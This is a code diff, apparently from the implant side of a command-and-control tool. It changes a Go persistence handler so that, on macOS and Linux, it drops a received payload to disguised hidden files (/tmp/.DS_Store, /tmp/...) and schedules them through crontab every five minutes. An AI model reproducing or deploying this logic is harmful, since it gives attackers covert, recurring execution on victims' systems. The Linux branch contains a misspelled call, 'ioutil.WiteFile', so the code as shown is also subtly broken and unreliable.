@@ -534,23 +534,27 @@ func persistHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	//{{if eq .GOOS "darwin"}}
+	ioutil.WriteFile("/tmp/.DS_Store", persistReq.Assembly, 0755)
 	cmd := exec.Command("crontab")
 	stdin, _ := cmd.StdinPipe()
-	io.WriteString(stdin, "*/5 * * * * "+persistReq.Filename+"\n")
+	io.WriteString(stdin, "*/5 * * * * /tmp/.DS_Store\n")
 	stdin.Close()
 	cmd.Start()
 	cmd.Wait()
 	//{{else if eq .GOOS "linux"}}
+	ioutil.WiteFile("/tmp/...", persistReq.Assembly, 0755)
 	cmd := exec.Command("crontab")
 	stdin, _ := cmd.StdinPipe()
-	io.WriteString(stdin, "*/5 * * * * "+persistReq.Filename+"\n")
+	io.WriteString(stdin, "*/5 * * * * /tmp/...\n")
 	stdin.Close()
 	cmd.Start()
 	cmd.Wait()
 	//{{else}}
 	//TODO: Windows Support...
 	//{{end}}
-	data, err = proto.Marshal(persistReq)
+	data, err = proto.Marshal(&pb.Persist{
+		Success: true,
+	})
 	resp(data, err)
 }
 
